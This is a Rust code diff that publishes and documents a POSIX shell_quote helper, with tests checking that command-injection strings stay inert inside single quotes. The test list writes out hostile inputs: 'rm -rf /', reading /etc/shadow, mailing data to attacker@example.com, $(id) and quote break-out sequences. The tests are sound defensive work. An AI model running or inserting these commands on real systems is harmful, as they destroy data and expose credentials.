@@ -66,9 +66,9 @@ impl Command {
     pub fn to_shell(&self) -> String {
         match self {
             Command::Shell(command) => command.clone(),
-            Command::ReadFile(path) => format!("cat {}", quote(path)),
+            Command::ReadFile(path) => format!("cat {}", shell_quote(path)),
             Command::SampleTwice { path, delay_ms } => {
-                let quoted = quote(path);
+                let quoted = shell_quote(path);
                 // `sleep` takes fractional seconds on GNU coreutils and busybox alike.
                 let seconds = *delay_ms as f64 / 1000.0;
                 format!("cat {quoted}; echo '{SAMPLE_SEPARATOR}'; sleep {seconds:.3}; cat {quoted}")
@@ -87,7 +87,15 @@ impl Command {
 }
 
 /// Single-quotes a string for POSIX shell.
-fn quote(value: &str) -> String {
+///
+/// Everything inside single quotes is literal to a POSIX shell — no expansion, no
+/// substitution, no word splitting. The one character that cannot appear is the single
+/// quote itself, which is why it is closed, escaped and reopened.
+///
+/// This is the only thing between a path a user typed and arbitrary command execution on
+/// their server, so it is public, documented, and tested against the injections people
+/// actually try.
+pub fn shell_quote(value: &str) -> String {
     format!("'{}'", value.replace('\'', r"'\''"))
 }
 
@@ -539,5 +547,80 @@ mod tests {
 
         CollectorOutput::Containers(Vec::new()).apply(&mut snapshot);
         assert_eq!(snapshot.containers, Some(Vec::new()));
+    }
+
+    #[test]
+    fn quoting_neutralises_the_injections_people_actually_try() {
+        // A path now comes from a text field in a file browser, so this function is the
+        // boundary between what a user types and what runs as root on their server.
+        // Every case here is a real shell metacharacter sequence; none of them may
+        // survive as syntax.
+        let attacks = [
+            "/var/www; rm -rf /",
+            "/var/www && cat /etc/shadow",
+            "/var/www | mail attacker@example.com",
+            "/var/www`whoami`",
+            "/var/www$(id)",
+            "/var/www${HOME}",
+            "/var/www\nrm -rf /",
+            "/var/www > /etc/passwd",
+            "/var/www & sleep 100",
+            "*",
+            "~/../../etc/shadow",
+            // The ones that matter most: a bare quote is the only character that can end
+            // the literal, so an escaping bug shows up here and nowhere else. Without
+            // these the test passes even if the escape is removed entirely.
+            "'; rm -rf / #",
+            "/var/www/it's",
+            r"'\''; id; '",
+            "''''",
+        ];
+
+        for attack in attacks {
+            let quoted = shell_quote(attack);
+
+            // Single quotes are the whole mechanism: everything between them is literal,
+            // and the only way out is a quote that is not part of an escape sequence.
+            assert!(
+                is_single_shell_literal(&quoted),
+                "{attack} escaped its quoting"
+            );
+        }
+    }
+
+    #[test]
+    fn a_single_quote_is_closed_escaped_and_reopened() {
+        // The one character that cannot appear inside single quotes, and therefore the
+        // only way out of them. `it's` must become `'it'\''s'`.
+        assert_eq!(shell_quote("it's"), r"'it'\''s'");
+
+        // The classic break-out attempt: close the quote, run a command, reopen.
+        let attack = "'; rm -rf / #";
+        let quoted = shell_quote(attack);
+        assert_eq!(quoted, r"''\''; rm -rf / #'");
+        assert!(is_single_shell_literal(&quoted));
+    }
+
+    /// Whether the whole string is one shell literal that cannot be escaped from.
+    ///
+    /// "Contains no quotes inside" would be the obvious check and is wrong: the escape
+    /// sequence `'\''` contains two. The real invariant is that every inner quote belongs
+    /// to such a sequence, so removing them leaves none behind.
+    fn is_single_shell_literal(quoted: &str) -> bool {
+        let Some(inner) = quoted
+            .strip_prefix('\'')
+            .and_then(|rest| rest.strip_suffix('\''))
+        else {
+            return false;
+        };
+        !inner.replace(r"'\''", "").contains('\'')
+    }
+
+    #[test]
+    fn an_ordinary_path_survives_unchanged_inside_the_quotes() {
+        assert_eq!(shell_quote("/var/www/html"), "'/var/www/html'");
+        assert_eq!(shell_quote(""), "''");
+        // Spaces are exactly why quoting exists in the first place.
+        assert_eq!(shell_quote("/home/Иван/мой сайт"), "'/home/Иван/мой сайт'");
     }
 }
